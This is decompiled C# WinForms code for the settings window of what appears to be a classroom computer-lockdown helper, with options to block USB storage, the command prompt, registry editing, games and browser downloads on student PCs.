			this.RadioButton17 = new RadioButton();
			this.Label19 = new Label();
			this.Label20 = new Label();
			this.Label21 = new Label();
			this.GroupBox11 = new GroupBox();
			this.RadioButton19 = new RadioButton();
			this.RadioButton20 = new RadioButton();
			this.Label22 = new Label();
			this.Label23 = new Label();
			this.GroupBox4.SuspendLayout();
			this.GroupBox5.SuspendLayout();
			this.GroupBox10.SuspendLayout();
			this.GroupBox9.SuspendLayout();
			this.GroupBox1.SuspendLayout();
			this.GroupBox2.SuspendLayout();
			this.GroupBox3.SuspendLayout();
			this.GroupBox7.SuspendLayout();
			this.GroupBox12.SuspendLayout();
			this.GroupBox6.SuspendLayout();
			this.GroupBox8.SuspendLayout();
			this.GroupBox11.SuspendLayout();
			base.SuspendLayout();
			this.Button1.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.Button1.Location = new Point(728, 638);
			this.Button1.Name = "Button1";
			this.Button1.Size = new Size(118, 33);
			this.Button1.TabIndex = 0;
			this.Button1.Text = "保存设置(需10秒)";
			this.Button1.UseVisualStyleBackColor = true;
			this.RadioButton1.AutoSize = true;
			this.RadioButton1.Location = new Point(6, 11);
			this.RadioButton1.Name = "RadioButton1";
			this.RadioButton1.Size = new Size(53, 16);
			this.RadioButton1.TabIndex = 11;
			this.RadioButton1.Text = "允 许";
			this.RadioButton1.UseVisualStyleBackColor = true;
			this.RadioButton2.AutoSize = true;
			this.RadioButton2.Checked = true;
			this.RadioButton2.Location = new Point(81, 11);
			this.RadioButton2.Name = "RadioButton2";
			this.RadioButton2.Size = new Size(53, 16);
			this.RadioButton2.TabIndex = 12;
			this.RadioButton2.TabStop = true;
			this.RadioButton2.Text = "禁 止";
			this.RadioButton2.UseVisualStyleBackColor = true;
			this.RadioButton4.AutoSize = true;
			this.RadioButton4.Checked = true;
			this.RadioButton4.Location = new Point(82, 11);
			this.RadioButton4.Name = "RadioButton4";
			this.RadioButton4.Size = new Size(53, 16);
			this.RadioButton4.TabIndex = 1;
			this.RadioButton4.TabStop = true;
			this.RadioButton4.Text = "禁 止";
			this.RadioButton4.UseVisualStyleBackColor = true;
			this.RadioButton3.AutoSize = true;
			this.RadioButton3.Location = new Point(7, 11);
			this.RadioButton3.Name = "RadioButton3";
			this.RadioButton3.Size = new Size(47, 16);
			this.RadioButton3.TabIndex = 0;
			this.RadioButton3.Text = "允许";
			this.RadioButton3.UseVisualStyleBackColor = true;
			this.RadioButton6.AutoSize = true;
			this.RadioButton6.Checked = true;
			this.RadioButton6.Location = new Point(81, 11);
			this.RadioButton6.Name = "RadioButton6";
			this.RadioButton6.Size = new Size(53, 16);
			this.RadioButton6.TabIndex = 1;
			this.RadioButton6.TabStop = true;
			this.RadioButton6.Text = "禁 止";
			this.RadioButton6.UseVisualStyleBackColor = true;
			this.RadioButton5.AutoSize = true;
			this.RadioButton5.Location = new Point(6, 11);
			this.RadioButton5.Name = "RadioButton5";
			this.RadioButton5.Size = new Size(47, 16);
			this.RadioButton5.TabIndex = 0;
			this.RadioButton5.Text = "允许";
			this.RadioButton5.UseVisualStyleBackColor = true;
			this.OpenFileDialog1.FileName = "OpenFileDialog1";
			this.OpenFileDialog1.Filter = "exe文件 |*.exe";
			this.OpenFileDialog1.InitialDirectory = "C:\\Program Files (x86)";
			this.Button2.Location = new Point(25, 50);
			this.Button2.Name = "Button2";
			this.Button2.Size = new Size(123, 27);
			this.Button2.TabIndex = 16;
			this.Button2.Text = "手动选择学生端文件";
			this.Button2.UseVisualStyleBackColor = true;
			this.GroupBox4.Controls.Add(this.Label4);
			this.GroupBox4.Controls.Add(this.Button3);
			this.GroupBox4.Controls.Add(this.TextBox1);
			this.GroupBox4.Controls.Add(this.Button2);
			this.GroupBox4.Controls.Add(this.Label1);
			this.GroupBox4.Location = new Point(56, 12);
			this.GroupBox4.Name = "GroupBox4";
			this.GroupBox4.Size = new Size(738, 85);
			this.GroupBox4.TabIndex = 17;
			this.GroupBox4.TabStop = false;
			this.GroupBox4.Text = "1、电子教室学生端的文件名和路径";
			this.Label4.AutoSize = true;
			this.Label4.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.Label4.Location = new Point(184, 67);
			this.Label4.Name = "Label4";
			this.Label4.Size = new Size(401, 12);
			this.Label4.TabIndex = 21;
			this.Label4.Text = "（红蜘蛛:C:\\Program Files (x86)\\3000soft\\Red Spider\\REDAgent.exe）";
			this.Button3.Font = new Font("宋体", 9f);
			this.Button3.Location = new Point(633, 47);
			this.Button3.Name = "Button3";
			this.Button3.Size = new Size(81, 27);
			this.Button3.TabIndex = 20;
			this.Button3.Text = "设置方法";
			this.Button3.UseVisualStyleBackColor = true;
			this.TextBox1.Font = new Font("宋体", 9f);
			this.TextBox1.Location = new Point(25, 20);
			this.TextBox1.Name = "TextBox1";
			this.TextBox1.Size = new Size(689, 21);
			this.TextBox1.TabIndex = 19;
			this.Label1.AutoSize = true;
			this.Label1.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.Label1.Location = new Point(184, 48);
			this.Label1.Name = "Label1";
			this.Label1.Size = new Size(401, 12);
			this.Label1.TabIndex = 17;
			this.Label1.Text = "（极域:c:\\.\\StudentMain.exe，锐捷云课堂:E:\\..\\ClassMangerApp.exe）";
			this.GroupBox5.Controls.Add(this.Label8);
			this.GroupBox5.Controls.Add(this.pd_new);
			this.GroupBox5.Location = new Point(56, 491);
			this.GroupBox5.Name = "GroupBox5";
			this.GroupBox5.Size = new Size(520, 57);
			this.GroupBox5.TabIndex = 19;
			this.GroupBox5.TabStop = false;
			this.GroupBox5.Text = "10、设置密码（因极域密码容易查看到，所以本密码不要与极域密码相同）";
			this.Label8.AutoSize = true;
			this.Label8.Location = new Point(347, 28);
			this.Label8.Name = "Label8";
			this.Label8.Size = new Size(155, 12);
			this.Label8.TabIndex = 3;
			this.Label8.Text = "（6位及以上的字母或数字）";
			this.pd_new.Location = new Point(154, 25);
			this.pd_new.Name = "pd_new";
			this.pd_new.PasswordChar = '*';
			this.pd_new.Size = new Size(192, 21);
			this.pd_new.TabIndex = 1;
			this.Label2.AutoSize = true;
			this.Label2.ForeColor = Color.Red;
			this.Label2.Location = new Point(73, 545);
			this.Label2.Name = "Label2";
			this.Label2.Size = new Size(0, 12);
			this.Label2.TabIndex = 4;
			this.RadioButton10.AutoSize = true;
			this.RadioButton10.Location = new Point(8, 12);
			this.RadioButton10.Name = "RadioButton10";
			this.RadioButton10.Size = new Size(59, 16);
			this.RadioButton10.TabIndex = 1;
			this.RadioButton10.Text = "不显示";
			this.RadioButton10.UseVisualStyleBackColor = true;
			this.RadioButton9.AutoSize = true;
			this.RadioButton9.Checked = true;
			this.RadioButton9.Location = new Point(82, 11);
			this.RadioButton9.Name = "RadioButton9";
			this.RadioButton9.Size = new Size(53, 16);
			this.RadioButton9.TabIndex = 0;
			this.RadioButton9.TabStop = true;
			this.RadioButton9.Text = "显 示";
			this.RadioButton9.UseVisualStyleBackColor = true;
			this.Label10.AutoSize = true;
			this.Label10.ForeColor = Color.DarkRed;
			this.Label10.Location = new Point(403, 244);
			this.Label10.Name = "Label10";
			this.Label10.Size = new Size(443, 12);
			this.Label10.TabIndex = 2;
			this.Label10.Text = "（强烈建议禁止，学生按win+Tab或在任务栏上点右键，可用虚拟桌面来脱离控制）";
			this.RadioButton12.AutoSize = true;
			this.RadioButton12.Checked = true;
			this.RadioButton12.Location = new Point(81, 11);
			this.RadioButton12.Name = "RadioButton12";
			this.RadioButton12.Size = new Size(59, 16);
			this.RadioButton12.TabIndex = 1;
			this.RadioButton12.TabStop = true;
			this.RadioButton12.Text = "禁 止 ";
			this.RadioButton12.UseVisualStyleBackColor = true;
			this.RadioButton11.AutoSize = true;
			this.RadioButton11.Location = new Point(7, 11);
			this.RadioButton11.Name = "RadioButton11";
			this.RadioButton11.Size = new Size(53, 16);
			this.RadioButton11.TabIndex = 0;
			this.RadioButton11.Text = "允 许";
			this.RadioButton11.UseVisualStyleBackColor = true;
			this.GroupBox10.Controls.Add(this.Button_restorepic);
			this.GroupBox10.Controls.Add(this.Button_selectpic);
			this.GroupBox10.Location = new Point(56, 563);
			this.GroupBox10.Name = "GroupBox10";
			this.GroupBox10.Size = new Size(520, 62);
			this.GroupBox10.TabIndex = 23;
			this.GroupBox10.TabStop = false;
			this.GroupBox10.Text = "11、可选：设置学生电脑桌面";
			this.Button_restorepic.Location = new Point(371, 20);
			this.Button_restorepic.Name = "Button_restorepic";
			this.Button_restorepic.Size = new Size(131, 29);
			this.Button_restorepic.TabIndex = 1;
			this.Button_restorepic.Text = "恢复windows默认桌面";
			this.Button_restorepic.UseVisualStyleBackColor = true;
			this.Button_selectpic.Location = new Point(200, 20);
			this.Button_selectpic.Name = "Button_selectpic";
			this.Button_selectpic.Size = new Size(127, 29);
			this.Button_selectpic.TabIndex = 0;
			this.Button_selectpic.Text = "选择背景图(内含6张)";
			this.Button_selectpic.UseVisualStyleBackColor = true;
			this.GroupBox9.Controls.Add(this.RadioButton13);
			this.GroupBox9.Controls.Add(this.RadioButton14);
			this.GroupBox9.Location = new Point(56, 424);
			this.GroupBox9.Name = "GroupBox9";
			this.GroupBox9.Size = new Size(520, 53);
			this.GroupBox9.TabIndex = 15;
			this.GroupBox9.TabStop = false;
			this.GroupBox9.Text = "9、扫雷、纸牌、拼图板、谷歌浏览器的小恐龙、Edge浏览器的冲浪等小游戏";
			this.RadioButton13.AutoSize = true;
			this.RadioButton13.Checked = true;
			this.RadioButton13.Location = new Point(277, 28);
			this.RadioButton13.Name = "RadioButton13";
			this.RadioButton13.Size = new Size(53, 16);
			this.RadioButton13.TabIndex = 1;
			this.RadioButton13.TabStop = true;
			this.RadioButton13.Text = "禁 止";
			this.RadioButton13.UseVisualStyleBackColor = true;
			this.RadioButton14.AutoSize = true;
			this.RadioButton14.Location = new Point(202, 28);
			this.RadioButton14.Name = "RadioButton14";
			this.RadioButton14.Size = new Size(53, 16);
			this.RadioButton14.TabIndex = 0;
			this.RadioButton14.Text = "允 许";
			this.RadioButton14.UseVisualStyleBackColor = true;
			this.Label11.AutoSize = true;
			this.Label11.Location = new Point(65, 120);
			this.Label11.Name = "Label11";
			this.Label11.Size = new Size(101, 12);
			this.Label11.TabIndex = 24;
			this.Label11.Text = "2、USB存储设备：";
			this.Label12.AutoSize = true;
			this.Label12.Location = new Point(64, 158);
			this.Label12.Name = "Label12";
			this.Label12.Size = new Size(131, 12);
			this.Label12.TabIndex = 25;
			this.Label12.Text = "3、\"火绒\"杀毒软件：";
			this.Label13.AutoSize = true;
			this.Label13.Location = new Point(64, 200);
			this.Label13.Name = "Label13";
			this.Label13.Size = new Size(95, 12);
			this.Label13.TabIndex = 26;
			this.Label13.Text = "4、命令提示符：";
			this.Label15.AutoSize = true;
			this.Label15.Location = new Point(65, 240);
			this.Label15.Name = "Label15";
			this.Label15.Size = new Size(173, 12);
			this.Label15.TabIndex = 28;
			this.Label15.Text = "5、windows键和任务栏的右键：";
			this.Label16.AutoSize = true;
			this.Label16.Location = new Point(64, 283);
			this.Label16.Name = "Label16";
			this.Label16.Size = new Size(197, 12);
			this.Label16.TabIndex = 29;
			this.Label16.Text = "6、机器编号（取计算机名的后6位）";
			this.GroupBox1.Controls.Add(this.RadioButton1);
			this.GroupBox1.Controls.Add(this.RadioButton2);
			this.GroupBox1.Location = new Point(252, 105);
			this.GroupBox1.Name = "GroupBox1";
			this.GroupBox1.Size = new Size(149, 33);
			this.GroupBox1.TabIndex = 30;
			this.GroupBox1.TabStop = false;
			this.GroupBox2.Controls.Add(this.RadioButton4);
			this.GroupBox2.Controls.Add(this.RadioButton3);
			this.GroupBox2.Location = new Point(252, 146);
			this.GroupBox2.Name = "GroupBox2";
			this.GroupBox2.Size = new Size(150, 33);
			this.GroupBox2.TabIndex = 31;
			this.GroupBox2.TabStop = false;
			this.GroupBox3.Controls.Add(this.RadioButton6);
			this.GroupBox3.Controls.Add(this.RadioButton5);
			this.GroupBox3.Location = new Point(252, 190);
			this.GroupBox3.Name = "GroupBox3";
			this.GroupBox3.Size = new Size(149, 33);
			this.GroupBox3.TabIndex = 32;
			this.GroupBox3.TabStop = false;
			this.GroupBox7.Controls.Add(this.RadioButton12);
			this.GroupBox7.Controls.Add(this.RadioButton11);
			this.GroupBox7.Location = new Point(252, 229);
			this.GroupBox7.Name = "GroupBox7";
			this.GroupBox7.Size = new Size(150, 33);
			this.GroupBox7.TabIndex = 32;
			this.GroupBox7.TabStop = false;
			this.GroupBox12.Controls.Add(this.RadioButton10);
			this.GroupBox12.Controls.Add(this.RadioButton9);
			this.GroupBox12.Location = new Point(252, 269);
			this.GroupBox12.Name = "GroupBox12";
			this.GroupBox12.Size = new Size(149, 33);
			this.GroupBox12.TabIndex = 32;
			this.GroupBox12.TabStop = false;
			this.Label7.AutoSize = true;
			this.Label7.ForeColor = Color.Black;
			this.Label7.Location = new Point(402, 203);
			this.Label7.Name = "Label7";
			this.Label7.Size = new Size(401, 12);
			this.Label7.TabIndex = 35;
			this.Label7.Text = "（建议禁止，DEV C++ 在win7运行可以显示结果2秒，win10上可长期显示）";
			this.Label5.AutoSize = true;
			this.Label5.ForeColor = Color.Black;
			this.Label5.Location = new Point(31, 721);
			this.Label5.Name = "Label5";
			this.Label5.Size = new Size(239, 12);
			this.Label5.TabIndex = 36;
			this.Label5.Text = "但不能禁止360等其它浏览器下载，不能禁止";
			this.Label9.AutoSize = true;
			this.Label9.ForeColor = Color.Black;
			this.Label9.Location = new Point(34, 747);
			this.Label9.Name = "Label9";
			this.Label9.Size = new Size(341, 12);
			this.Label9.TabIndex = 37;
			this.Label9.Text = "浏览器，win10和win11只保留edge浏览器，最后再在这里设置。";
			this.LinkLabel2.AutoSize = true;
			this.LinkLabel2.BackColor = Color.Transparent;
			this.LinkLabel2.LinkColor = Color.FromArgb(0, 0, 192);
			this.LinkLabel2.Location = new Point(389, 747);
			this.LinkLabel2.Name = "LinkLabel2";
			this.LinkLabel2.Size = new Size(143, 12);
			this.LinkLabel2.TabIndex = 39;
			this.LinkLabel2.TabStop = true;
			this.LinkLabel2.Text = "chrome浏览器下载地址>>>";
			this.Label14.AutoSize = true;
			this.Label14.ForeColor = Color.Black;
			this.Label14.Location = new Point(400, 160);
			this.Label14.Name = "Label14";
			this.Label14.Size = new Size(503, 12);
			this.Label14.TabIndex = 40;
			this.Label14.Text = "（建议禁止，学生可用它的\"粉碎文件\"等功能，注：360安全卫士、QQ电脑管家类永远是禁止）";
			this.Label3.AutoSize = true;
			this.Label3.Location = new Point(30, 696);
			this.Label3.Name = "Label3";
			this.Label3.Size = new Size(905, 12);
			this.Label3.TabIndex = 41;
			this.Label3.Text = "注：网上有专门软件来破解小助手，强烈建议禁止浏览器下载文件。禁止后，学生可以在浏览器中复制图片，然后粘贴。本软件可禁止chrome、edge、firfox、IE的下载，";
			this.Label6.AutoSize = true;
			this.Label6.Location = new Point(273, 721);
			this.Label6.Name = "Label6";
			this.Label6.Size = new Size(521, 12);
			this.Label6.TabIndex = 42;
			this.Label6.Text = "假chrome(显示:谷歌浏览器)的小恐龙游戏，所以要先卸载一些浏览器，win7只保留google chrome";
			this.Label17.AutoSize = true;
			this.Label17.Location = new Point(62, 653);
			this.Label17.Name = "Label17";
			this.Label17.Size = new Size(221, 12);
			this.Label17.TabIndex = 33;
			this.Label17.Text = "12、浏览器下载软件和设置文件夹选项：";
			this.GroupBox6.Controls.Add(this.RadioButton8);
			this.GroupBox6.Controls.Add(this.RadioButton7);
			this.GroupBox6.Location = new Point(285, 640);
			this.GroupBox6.Name = "GroupBox6";
			this.GroupBox6.Size = new Size(165, 33);
			this.GroupBox6.TabIndex = 33;
			this.GroupBox6.TabStop = false;
			this.RadioButton8.AutoSize = true;
			this.RadioButton8.Checked = true;
			this.RadioButton8.Location = new Point(94, 11);
			this.RadioButton8.Name = "RadioButton8";
			this.RadioButton8.Size = new Size(59, 16);
			this.RadioButton8.TabIndex = 1;
			this.RadioButton8.TabStop = true;
			this.RadioButton8.Text = "禁 止 ";
			this.RadioButton8.UseVisualStyleBackColor = true;
			this.RadioButton7.AutoSize = true;
			this.RadioButton7.Location = new Point(16, 11);
			this.RadioButton7.Name = "RadioButton7";
			this.RadioButton7.Size = new Size(53, 16);
			this.RadioButton7.TabIndex = 0;
			this.RadioButton7.Text = "允 许";
			this.RadioButton7.UseVisualStyleBackColor = true;
			this.Label18.AutoSize = true;
			this.Label18.ForeColor = Color.DarkRed;
			this.Label18.Location = new Point(453, 653);
			this.Label18.Name = "Label18";
			this.Label18.Size = new Size(137, 12);
			this.Label18.TabIndex = 43;
			this.Label18.Text = "（强烈建议禁止！！！）";
			this.GroupBox8.Controls.Add(this.RadioButton16);
			this.GroupBox8.Controls.Add(this.RadioButton15);
			this.GroupBox8.Controls.Add(this.RadioButton17);
			this.GroupBox8.Location = new Point(255, 311);
			this.GroupBox8.Name = "GroupBox8";
			this.GroupBox8.Size = new Size(303, 33);
			this.GroupBox8.TabIndex = 45;
			this.GroupBox8.TabStop = false;
			this.RadioButton16.AutoSize = true;
			this.RadioButton16.Checked = true;
			this.RadioButton16.Location = new Point(79, 13);
			this.RadioButton16.Name = "RadioButton16";
			this.RadioButton16.Size = new Size(143, 16);
			this.RadioButton16.TabIndex = 53;
			this.RadioButton16.TabStop = true;
			this.RadioButton16.Text = "仅C++可生成新exe文件";
			this.RadioButton16.UseVisualStyleBackColor = true;
			this.RadioButton15.AutoSize = true;
			this.RadioButton15.Location = new Point(5, 13);
			this.RadioButton15.Name = "RadioButton15";
			this.RadioButton15.Size = new Size(71, 16);
			this.RadioButton15.TabIndex = 1;
			this.RadioButton15.Text = "全部允许";
			this.RadioButton15.UseVisualStyleBackColor = true;
			this.RadioButton17.AutoSize = true;
			this.RadioButton17.Location = new Point(227, 13);
			this.RadioButton17.Name = "RadioButton17";
			this.RadioButton17.Size = new Size(71, 16);
			this.RadioButton17.TabIndex = 0;
			this.RadioButton17.Text = "全部禁止";
			this.RadioButton17.UseVisualStyleBackColor = true;
			this.Label19.AutoSize = true;
			this.Label19.Location = new Point(64, 326);
			this.Label19.Name = "Label19";
			this.Label19.Size = new Size(197, 12);
			this.Label19.TabIndex = 44;
			this.Label19.Text = "7、新的exe、reg、bat等高危文件：";
			this.Label20.AutoSize = true;
			this.Label20.ForeColor = Color.Black;
			this.Label20.Location = new Point(559, 326);
			this.Label20.Name = "Label20";
			this.Label20.Size = new Size(275, 12);
			this.Label20.TabIndex = 51;
			this.Label20.Text = "（安装软件或复制exe文件到硬盘要先退出小助手）";
			this.Label21.AutoSize = true;
			this.Label21.ForeColor = Color.Black;
			this.Label21.Location = new Point(564, 375);
			this.Label21.Name = "Label21";
			this.Label21.Size = new Size(275, 12);
			this.Label21.TabIndex = 54;
			this.Label21.Text = "（mpython、考试软件、3d one不能设为完全禁止）";
			this.GroupBox11.Controls.Add(this.RadioButton19);
			this.GroupBox11.Controls.Add(this.RadioButton20);
			this.GroupBox11.Location = new Point(255, 362);
			this.GroupBox11.Name = "GroupBox11";
			this.GroupBox11.Size = new Size(303, 33);
			this.GroupBox11.TabIndex = 53;
			this.GroupBox11.TabStop = false;
			this.RadioButton19.AutoSize = true;
			this.RadioButton19.Checked = true;
			this.RadioButton19.Location = new Point(79, 13);
			this.RadioButton19.Name = "RadioButton19";
			this.RadioButton19.Size = new Size(71, 16);
			this.RadioButton19.TabIndex = 53;
			this.RadioButton19.TabStop = true;
			this.RadioButton19.Text = "自动关闭";
			this.RadioButton19.UseVisualStyleBackColor = true;
			this.RadioButton20.AutoSize = true;
			this.RadioButton20.Location = new Point(227, 13);
			this.RadioButton20.Name = "RadioButton20";
			this.RadioButton20.Size = new Size(71, 16);
			this.RadioButton20.TabIndex = 0;
			this.RadioButton20.Text = "完全禁止";
			this.RadioButton20.UseVisualStyleBackColor = true;
			this.Label22.AutoSize = true;
			this.Label22.Location = new Point(62, 377);
			this.Label22.Name = "Label22";
			this.Label22.Size = new Size(95, 12);
			this.Label22.TabIndex = 52;
			this.Label22.Text = "8、注册表编辑：";
			this.Label23.AutoSize = true;
			this.Label23.ForeColor = Color.Black;
			this.Label23.Location = new Point(402, 118);
			this.Label23.Name = "Label23";
			this.Label23.Size = new Size(503, 12);
			this.Label23.TabIndex = 40;
			this.Label23.Text = "（如果要使用机器人等外部设备，要设为允许，你可使用电子教室控制USB存储的开放和禁止）";
			base.AutoScaleDimensions = new SizeF(6f, 12f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(958, 787);
			base.Controls.Add(this.Label21);
			base.Controls.Add(this.GroupBox11);
			base.Controls.Add(this.Label22);
			base.Controls.Add(this.Label20);
			base.Controls.Add(this.GroupBox8);
			base.Controls.Add(this.Label19);
			base.Controls.Add(this.Label18);
			base.Controls.Add(this.GroupBox6);
			base.Controls.Add(this.Label17);
			base.Controls.Add(this.Label6);
			base.Controls.Add(this.Label3);
			base.Controls.Add(this.Label23);
			base.Controls.Add(this.Label14);
			base.Controls.Add(this.LinkLabel2);
			base.Controls.Add(this.Label9);
			base.Controls.Add(this.Label5);
			base.Controls.Add(this.Label7);
			base.Controls.Add(this.Label10);
			base.Controls.Add(this.GroupBox3);
			base.Controls.Add(this.GroupBox7);
			base.Controls.Add(this.GroupBox12);
			base.Controls.Add(this.GroupBox2);
			base.Controls.Add(this.GroupBox1);
			base.Controls.Add(this.Label16);
			base.Controls.Add(this.Label15);
			base.Controls.Add(this.Label13);
			base.Controls.Add(this.Label12);
			base.Controls.Add(this.Label11);
			base.Controls.Add(this.GroupBox9);
			base.Controls.Add(this.GroupBox10);
			base.Controls.Add(this.Label2);
			base.Controls.Add(this.GroupBox5);
			base.Controls.Add(this.GroupBox4);
			base.Controls.Add(this.Button1);
			base.Name = "Form1";
			base.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "设 置";
			this.GroupBox4.ResumeLayout(false);
			this.GroupBox4.PerformLayout();
			this.GroupBox5.ResumeLayout(false);
			this.GroupBox5.PerformLayout();
			this.GroupBox10.ResumeLayout(false);
			this.GroupBox9.ResumeLayout(false);
			this.GroupBox9.PerformLayout();
			this.GroupBox1.ResumeLayout(false);
			this.GroupBox1.PerformLayout();
			this.GroupBox2.ResumeLayout(false);
			this.GroupBox2.PerformLayout();
			this.GroupBox3.ResumeLayout(false);
			this.GroupBox3.PerformLayout();
			this.GroupBox7.ResumeLayout(false);
			this.GroupBox7.PerformLayout();
			this.GroupBox12.ResumeLayout(false);
			this.GroupBox12.PerformLayout();
			this.GroupBox6.ResumeLayout(false);
			this.GroupBox6.PerformLayout();
			this.GroupBox8.ResumeLayout(false);
			this.GroupBox8.PerformLayout();
			this.GroupBox11.ResumeLayout(false);
			this.GroupBox11.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x0600004D RID: 77 RVA: 0x00002399 File Offset: 0x00000599
		// (set) Token: 0x0600004E RID: 78 RVA: 0x0000A1D8 File Offset: 0x000083D8
		internal virtual Button Button1
		{
			[CompilerGenerated]
			get
			{
				return this.m_ConnectionAttr;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.PrepareInfo);
				Button button = this.m_ConnectionAttr;
				if (button != null)
				{
					button.Click -= eventHandler;
				}
				this.m_ConnectionAttr = value;
				button = this.m_ConnectionAttr;
				if (button != null)
				{
					button.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x0600004F RID: 79 RVA: 0x000023A1 File Offset: 0x000005A1
		// (set) Token: 0x06000050 RID: 80 RVA: 0x000023A9 File Offset: 0x000005A9
		internal virtual RadioButton RadioButton1 { get; set; }

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000051 RID: 81 RVA: 0x000023B2 File Offset: 0x000005B2
		// (set) Token: 0x06000052 RID: 82 RVA: 0x000023BA File Offset: 0x000005BA
		internal virtual RadioButton RadioButton2 { get; set; }

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000053 RID: 83 RVA: 0x000023C3 File Offset: 0x000005C3
		// (set) Token: 0x06000054 RID: 84 RVA: 0x000023CB File Offset: 0x000005CB
		internal virtual RadioButton RadioButton4 { get; set; }

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000055 RID: 85 RVA: 0x000023D4 File Offset: 0x000005D4
		// (set) Token: 0x06000056 RID: 86 RVA: 0x000023DC File Offset: 0x000005DC
		internal virtual RadioButton RadioButton3 { get; set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000057 RID: 87 RVA: 0x000023E5 File Offset: 0x000005E5
		// (set) Token: 0x06000058 RID: 88 RVA: 0x000023ED File Offset: 0x000005ED
		internal virtual RadioButton RadioButton6 { get; set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000059 RID: 89 RVA: 0x000023F6 File Offset: 0x000005F6
		// (set) Token: 0x0600005A RID: 90 RVA: 0x000023FE File Offset: 0x000005FE
		internal virtual RadioButton RadioButton5 { get; set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x0600005B RID: 91 RVA: 0x00002407 File Offset: 0x00000607
		// (set) Token: 0x0600005C RID: 92 RVA: 0x0000240F File Offset: 0x0000060F
		internal virtual OpenFileDialog OpenFileDialog1 { get; set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x0600005D RID: 93 RVA: 0x00002418 File Offset: 0x00000618
		// (set) Token: 0x0600005E RID: 94 RVA: 0x0000A21C File Offset: 0x0000841C
		internal virtual Button Button2
		{
			[CompilerGenerated]
			get
			{
				return this.issuerAttr;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ConcatInfo);
				Button button = this.issuerAttr;
				if (button != null)
				{
					button.Click -= eventHandler;
				}
				this.issuerAttr = value;
				button = this.issuerAttr;
				if (button != null)
				{
					button.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x0600005F RID: 95 RVA: 0x00002420 File Offset: 0x00000620
		// (set) Token: 0x06000060 RID: 96 RVA: 0x00002428 File Offset: 0x00000628
		internal virtual GroupBox GroupBox4 { get; set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000061 RID: 97 RVA: 0x00002431 File Offset: 0x00000631
		// (set) Token: 0x06000062 RID: 98 RVA: 0x00002439 File Offset: 0x00000639
		internal virtual Label Label1 { get; set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000063 RID: 99 RVA: 0x00002442 File Offset: 0x00000642
		// (set) Token: 0x06000064 RID: 100 RVA: 0x0000244A File Offset: 0x0000064A
		internal virtual TextBox TextBox1 { get; set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000065 RID: 101 RVA: 0x00002453 File Offset: 0x00000653
		// (set) Token: 0x06000066 RID: 102 RVA: 0x0000A260 File Offset: 0x00008460
		internal virtual Button Button3
		{
			[CompilerGenerated]
			get
			{
				return this._ClassAttr;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.SelectInfo);
				Button button = this._ClassAttr;
				if (button != null)
				{
					button.Click -= eventHandler;
				}
				this._ClassAttr = value;
				button = this._ClassAttr;
				if (button != null)
				{
					button.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000067 RID: 103 RVA: 0x0000245B File Offset: 0x0000065B
		// (set) Token: 0x06000068 RID: 104 RVA: 0x00002463 File Offset: 0x00000663
		internal virtual GroupBox GroupBox5 { get; set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000069 RID: 105 RVA: 0x0000246C File Offset: 0x0000066C
		// (set) Token: 0x0600006A RID: 106 RVA: 0x00002474 File Offset: 0x00000674
		internal virtual TextBox pd_new { get; set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x0600006B RID: 107 RVA: 0x0000247D File Offset: 0x0000067D
		// (set) Token: 0x0600006C RID: 108 RVA: 0x00002485 File Offset: 0x00000685
		internal virtual Label Label8 { get; set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x0600006D RID: 109 RVA: 0x0000248E File Offset: 0x0000068E
		// (set) Token: 0x0600006E RID: 110 RVA: 0x00002496 File Offset: 0x00000696
		internal virtual Label Label2 { get; set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x0600006F RID: 111 RVA: 0x0000249F File Offset: 0x0000069F
		// (set) Token: 0x06000070 RID: 112 RVA: 0x000024A7 File Offset: 0x000006A7
		internal virtual RadioButton RadioButton10 { get; set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000071 RID: 113 RVA: 0x000024B0 File Offset: 0x000006B0
		// (set) Token: 0x06000072 RID: 114 RVA: 0x000024B8 File Offset: 0x000006B8
		internal virtual RadioButton RadioButton9 { get; set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000073 RID: 115 RVA: 0x000024C1 File Offset: 0x000006C1
		// (set) Token: 0x06000074 RID: 116 RVA: 0x000024C9 File Offset: 0x000006C9
		internal virtual Label Label4 { get; set; }

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x06000075 RID: 117 RVA: 0x000024D2 File Offset: 0x000006D2
		// (set) Token: 0x06000076 RID: 118 RVA: 0x000024DA File Offset: 0x000006DA
		internal virtual Label Label10 { get; set; }

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x06000077 RID: 119 RVA: 0x000024E3 File Offset: 0x000006E3
		// (set) Token: 0x06000078 RID: 120 RVA: 0x000024EB File Offset: 0x000006EB
		internal virtual RadioButton RadioButton12 { get; set; }

		// Token: 0x17000023 RID: 35
